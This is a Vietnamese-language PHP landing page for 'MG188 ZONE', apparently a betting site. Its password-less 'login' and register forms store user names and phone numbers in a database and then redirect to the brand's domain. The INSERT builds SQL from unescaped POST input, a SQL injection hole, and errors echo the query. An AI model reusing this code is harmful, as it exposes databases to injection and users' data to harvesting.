<?php
    error_reporting(0);
    ini_set('display_errors', 0);
    session_start();
    include('token.php');
    $token=new Token();
    $arr_token=$token->getToken('login');
    if(isset($_POST)&&$_POST['login']==$_SESSION['login']){
        unset($_SESSION['login']);
        include_once 'connect.php';
        // Lấy dữ liệu từ form
        $user_name = '';
        if($_POST['user_name']) {$user_name = $_POST['user_name'];}
        $phone = $_POST['phone'];
        $created_at = date('Y-m-d H:i:s');
        // Thêm dữ liệu vào database




        
        $sql = "INSERT INTO data_customer (user_name, phone_number, created_at) VALUES ('$user_name', '$phone', '$created_at')";
        if (mysqli_query($conn, $sql)) {
            echo "Dữ liệu đã được gửi thành công.";
        } else {
            echo "Lỗi: " . $sql . "<br>" . mysqli_error($conn);
        }
        // Đóng kết nối
        mysqli_close($conn);

        header("Location: https://dn.mg188.zone/");
        exit;
    }
    
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MG188 ZONE | Đăng ký chính thức</title>
    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <section id="section">
        <div class="logo"><img class="img-logo" src="logo.png" alt="Logo"/></div>
        <button class="language"><img src="icon_vietnam.png" alt="Viet Nam"/></button>
        <span class="text_tieng_viet">Tiếng Việt</span>
        <button class="dang_nhap" id="showPopup_login"><span class="text_dangnhap">ĐĂNG NHẬP</span></button>
        <button class="dang_ky" id="showPopup2"><span class="text_dangky">ĐĂNG KÝ</span></button>
        <div class="menu"><img class="img_menu" src="menu_pc.png" alt="Menu"/></div>
        <div class="content"><img class="img_content" src="pc_mg188.png" alt="content"/></div>
    </section>
    <form method="post">
        <input type="hidden" name="<?php echo $arr_token['name'] ?>"  value="<?php echo $arr_token['value']?>" >
        <div class="popup" id="popup_login">
            <h2 class="popup_h2">ĐĂNG NHẬP</h2>
            <input name="user_name" class="popup_input" placeholder="Tên đăng nhập"/>
            <input name="phone" class="popup_input" type="tel" placeholder="Số điện thoại" pattern="(\+84|0)(9|8|7|5|3)[0-9]{8}" data-listener-added_d1d1e8c5="true" required/>
            <button type="submit" class="snip1457">Đăng nhập</button>
        </div>
    </form>
    <form method="POST">
        <input type="hidden" name="<?php echo $arr_token['name'] ?>"  value="<?php echo $arr_token['value']?>" >
        <div class="popup" id="popup_register">
            <h2 class="popup_h2">ĐĂNG KÝ</h2>
            <input id="input_number" name="phone" class="popup_input" type="tel" placeholder="Số điện thoại" pattern="(\+84|0)(9|8|7|5|3)[0-9]{8}" data-listener-added_d1d1e8c5="true"/>
            <button type="submit" id="register" class="snip1457">Đăng ký</button>
        </div>
    </form>
</body>
<script>
    window.addEventListener('load', function() {
        var width = window.innerWidth;
        if(width < 420) {
            var img = document.querySelector(".img_content")
            img.src = 'mobile_mg188.png'
        }
        var login = document.querySelector('#showPopup_login')
        login.addEventListener('click', function(e) {
            var popup = document.getElementById("popup_login");
            popup.style.display = "block"
            var content = document.querySelector(".content")
            content.style.opacity = '0.3'
        })
        var register = document.querySelector('#showPopup2')
        register.addEventListener('click', function(e) {
            var popup = document.getElementById("popup_register");
            popup.style.display = "block"
            var content = document.querySelector(".content")
            content.style.opacity = '0.3'
            var number = document.querySelector('#input_number')
            number.style.marginTop = '5px'
            var register = document.querySelector('#register')
            register.style.marginTop = '-5px'
            var popup_register = document.querySelector('#popup_register')
            popup_register.style.height = '190px'
        })
        function closePopup() {
            // Lấy thẻ popup và đóng nó
            var popup = document.getElementById("myPopup");
            popup.style.display = "none";
        }
    })
</script>
</html>